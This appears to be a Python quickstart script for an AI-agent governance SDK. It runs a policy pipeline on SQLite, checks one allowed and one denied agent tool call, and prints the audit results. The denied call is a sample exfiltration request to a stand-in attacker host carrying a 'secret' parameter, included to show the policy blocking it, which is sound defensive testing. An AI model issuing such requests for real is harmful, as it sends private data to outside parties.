"""SDK-05 zero-infra quickstart: the full governed loop on SQLite + in-process opa-wasm, no Docker /
Postgres / OPA server. Loads a COMMITTED demo policy.wasm (built once at authoring time); all other
policy metadata is derived in-process from the demo constitution via the pure-Python compiler."""
from __future__ import annotations

import asyncio
from dataclasses import dataclass
from importlib.resources import files
from pathlib import Path
from tempfile import mkdtemp

from sqlalchemy import create_engine, func, select

from agentos_constitution import compile_constitution, load_constitution
from agentos_contract import ActionType, AgentAction, Outcome
from agentos_controlplane.audit import AuditWriter
from agentos_controlplane.auth import resolve_api_token
from agentos_controlplane.registry import Registry
from agentos_controlplane.store.engine import create_all, create_session_factory
from agentos_controlplane.store.models import AuditRecord
from agentos_pipeline.identity import IdentityStage
from agentos_pipeline.policy import ConstitutionPolicyEngine
from agentos_pipeline.posture import PostureMap
from agentos_pipeline.risk import PromptInjectionScorer
from agentos_pipeline.runner import Pipeline

_PKG = files("agentos_sdk.quickstart")
DEMO_AGENT = "quickstart-agent"


@dataclass
class QuickstartResult:
    allow_outcome: Outcome
    deny_outcome: Outcome
    audit_records: int
    api_token: str
    db_path: str


def _build_engine() -> tuple[ConstitutionPolicyEngine, str]:
    """In-process engine from the COMMITTED policy.wasm + pure-Python compiled metadata. No OPA CLI."""
    constitution = load_constitution(str(_PKG / "demo_constitution.yaml"))
    bundle = compile_constitution(constitution)
    principles_meta = {
        p.id: {"title": p.title, "statement": p.statement, "effect": p.effect,
               "side_effects": [s.value for s in p.side_effects], "remediation": p.remediation}
        for p in constitution.principles
    }
    engine = ConstitutionPolicyEngine(
        wasm_path=str(_PKG / "policy.wasm"),
        lists=bundle.lists,
        constitution_version=bundle.constitution_version,
        principles_meta=principles_meta,
    )
    # An allowlisted host for the ALLOW demo (first entry of the egress allowlist).
    allow_host = next(iter(next(iter(bundle.lists.values()), ["example.com"])), "example.com")
    return engine, allow_host


def run(db_path: str | None = None) -> QuickstartResult:
    db_path = db_path or str(Path(mkdtemp(prefix="agentos_quickstart_")) / "quickstart.db")
    engine_db = create_engine(f"sqlite+pysqlite:///{db_path}")
    create_all(engine_db)
    sf = create_session_factory(engine_db)
    registry = Registry(sf)
    token = registry.register(DEMO_AGENT)
    policy_engine, allow_host = _build_engine()
    pipeline = Pipeline(
        identity=IdentityStage(registry.identity),
        policy=policy_engine,
        scorers=[PromptInjectionScorer()],
        audit=AuditWriter(sf, signer=registry.identity),
        posture=PostureMap(),
    )

    def act(url: str) -> AgentAction:
        return AgentAction(agent_id=DEMO_AGENT, type=ActionType.tool_call, target="http_get",
                           payload={"url": url, "content": ""}, identity_token=token)

    allow = asyncio.run(pipeline.evaluate(act(f"https://{allow_host}/data")))
    deny = asyncio.run(pipeline.evaluate(act("https://attacker.example/exfil?x=secret")))

    with sf() as s:
        n = s.scalar(select(func.count()).select_from(AuditRecord))

    api_token = resolve_api_token(None)
    return QuickstartResult(allow.outcome, deny.outcome, n, api_token, db_path)


def main() -> None:
    r = run()
    print("agentos-guard quickstart — full governed loop on SQLite + in-process opa-wasm\n")
    print(f"  allowed action  -> {r.allow_outcome.value}")
    print(f"  exfil action    -> {r.deny_outcome.value}")
    print(f"  audit records   -> {r.audit_records} (hash-chained, signed)")
    print(f"  sqlite db       -> {r.db_path}")
    print(f"\n  dev API token (for the control-plane API / dashboard): {r.api_token}")
    print("  start the API:   uvicorn-style create_app(...) — see the dashboard slice (5f)")
